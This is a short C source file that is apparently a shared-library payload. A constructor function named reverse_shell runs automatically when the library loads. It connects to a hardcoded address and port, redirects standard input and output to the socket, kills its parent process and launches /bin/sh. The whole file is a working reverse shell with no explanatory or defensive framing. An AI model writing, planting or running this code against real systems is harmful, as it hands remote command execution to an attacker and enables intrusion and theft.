#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>

#define port 1234
#define addr "127.0.0.1"

void __attribute__((constructor)) reverse_shell(){ 
  int socket_fd;
  int connection = -1;
  int pid;
  struct sockaddr_in server;  
  
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = inet_addr(addr);
    
  while(connection < 0){
    sleep(5);
    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
  }
    
  if((pid = fork()) == 0){
    dup2(socket_fd,0);
    dup2(socket_fd,1);
    dup2(socket_fd,2);
    kill(getppid(), SIGKILL);
    execve("/bin/sh", NULL, NULL);
  }else{
    wait(NULL);
    close(socket_fd);
    exit(0);
  }
}
